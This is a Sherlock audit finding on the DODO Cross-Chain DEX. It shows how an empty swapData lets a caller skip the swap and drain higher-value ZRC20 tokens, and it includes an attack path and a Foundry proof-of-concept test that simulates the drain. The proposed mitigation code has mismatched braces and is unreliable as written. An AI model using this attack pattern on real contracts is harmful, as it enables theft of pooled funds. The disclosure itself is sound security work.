---
tags:
  - lang/solidity
  - sector/bridge
  - sector/dex
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
protocol: "[[DODO Cross Chain DEX]]"
auditors:
  - X0sauce
report: "https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging"
genome:
  - "[[access-roles]]"
  - "[[direct-drain]]"
---
# H-3: Attacker can steal an  high-value token due to lack of swap execution

- id: 58580
- impact: HIGH
- protocol: DODO Cross-Chain DEX
- reporter: X0sauce (Sherlock)
- source: N/A

## Summary


Summary: A bug has been found in the `GatewayTransferNative` contract that allows attackers to bypass swaps and drain high-value assets held by the contract. This occurs when the `withdrawToNativeChain` or `onCall` functions are called and the `swapData` parameter is left empty. If the `decoded.targetZRC20` token is different from the `zrc20` token, the function will return the original token amount without performing a swap. This can lead to significant loss of funds from the protocol's token balances and an imbalance in asset distribution. A proof of concept has been provided to demonstrate the exploit. The protocol team has fixed this issue in the code. 

## Details


Source: https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging/issues/416 

## Found by 
0xc0ffEE, AnomX, CoheeYang, Cybrid, EgisSecurity, X0sauce, edger, hunt1, pyk, silver\_eth, wellbyt3

### Summary

 Whenever [`withdrawToNativeChain`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayTransferNative.sol#L530) or[`onCall`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayTransferNative.sol#L395) is called on the  [`GatewayTransferNative`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayTransferNative.sol#L20C10-L20C31)  . The [`_doMixSwap()`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayTransferNative.sol#L425)  is trigger and the function returns the original token amount without enforcing a swap when `swapData` is empty. If `decoded.targetZRC20 != zrc20`, this leads to unexpected token transfers, allowing Attacker to bypass swaps and drain higher-value assets held by the contract.


### Root Cause

https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/d4834a468f7dad56b007b4450397289d4f767757/omni-chain-contracts/contracts/GatewayTransferNative.sol#L430
```solidity
if (swapData.length == 0) {
    return amount;
}
```

This check skips the swap entirely when `swapData` is empty, and there is no check whether the input `zrc20` == `decoded.targetZRC20`



### Internal Pre-conditions

- The caller uses `withdrawToNativeChain()` or `onCall()`  
- Sets `swapData = ""` (empty)  
- Sets `decoded.targetZRC20` to a different token than `zrc20`


### External Pre-conditions

- `decoded.targetZRC20` represents a significantly higher-value token compare to the deposited `zrc20 `(e.g., ETH.ARB ~$2300 vs AVAX ~$20)  
- The contract holds those tokens, often due to refund flows from reverted cross-chain messages


### Attack Path

1. Attacker calls `withdrawToNativeChain()` with:
   - `fromToken = AVAX-ZRC`
   - `decoded.targetZRC20 = ETH.ARB-ZRC`
   - `swapData = ""`
2. `withdrawToNativeChain()`  functions decodes the payload and calls `_doMixSwap()`
3. `_doMixSwap()` skips the swap and returns the full AVAX amount
4. User receives ETH.ARB tokens in 1:1 amount (in wei), leading to a huge gain  
5. Protocol loses high-value tokens without performing a valid swap


### Impact

This can lead to major loss of funds from the protocol’s ZRC20 token balances, especially those intended for refunds. The attacker receives assets at favorable USD rates, causing imbalance.


### PoC

**note I am using a token difference here to show the impact  because the provided test suite has some issue with price conversion**

place this in `test/GatewayTransferNative.t.sol`  and run 
`forge test --mt test_IamOTI_badSwapdataofDoMIxSwap --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public`
```solidity
function test_IamOTI_badSwapdataofDoMIxSwap() public {
    // Simulate production state: preload contract with ZRC20 balances
    token1Z.mint(address(gatewayTransferNative), 2000 ether); // token1Z = AVAX-ZRC (~$20)
    token2Z.mint(address(gatewayTransferNative), 2000 ether); // token2Z = ETH.ARB-ZRC (~$2300)

    uint256 amount = 100 ether;
    uint32 dstChainId = 421614; // Arbitrum Sepolia testnet chain ID

    // Construct the cross-chain message with a mismatched targetZRC20 and empty swapData
    address targetZRC20 = address(token2Z); // target is ETH.ARB-ZRC
    bytes memory sender = abi.encodePacked(user1);
    bytes memory receiver = abi.encodePacked(user2);
    bytes memory swapDataZ = ""; // ← this triggers the early return in _doMixSwap
    bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
    bytes memory fromTokenB = abi.encodePacked(address(token2B));
    bytes memory toTokenB = abi.encodePacked(address(token2B));
    bytes memory swapDataB = "";
    bytes memory accounts = "";

    // Encode the malicious message payload
    bytes memory message = encodeMessage(
        dstChainId,
        targetZRC20,
        sender,
        receiver,
        swapDataZ,
        contractAddress,
        abi.encodePacked(fromTokenB, toTokenB, swapDataB),
        accounts
    );

    // Execute the attack simulation
    vm.startPrank(user1);
    token1Z.approve(address(gatewayTransferNative), amount);
    gatewayTransferNative.withdrawToNativeChain(address(token1Z), amount, message);
    vm.stopPrank();

    // Validate balances
    assertEq(token1Z.balanceOf(user1), initialBalance - amount);
// it is almost 1:1 token2B.balanceOf(user2) is around 98.9e18 the different is the protocol fee and the gas fee
    assertApproxEqAbs(token2B.balanceOf(user2), amount, 1.2e18); 
}
```
#### Note 
the same issue exist in `GatewayCrossChain`


### Mitigation

Add a strict validation to enforce swaps when the tokens differ:

```solidity
  function _doMixSwap(address zrc20,bytes memory swapData, uint256 amount, MixSwapParams memory params)
        internal
        returns (uint256 outputAmount)
    {
        if (swapData.length == 0) 
       require(params.toToken == zrc20 );
            return amount;
        }
___rest of the code 
}
```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Skyewwww/omni-chain-contracts/pull/33





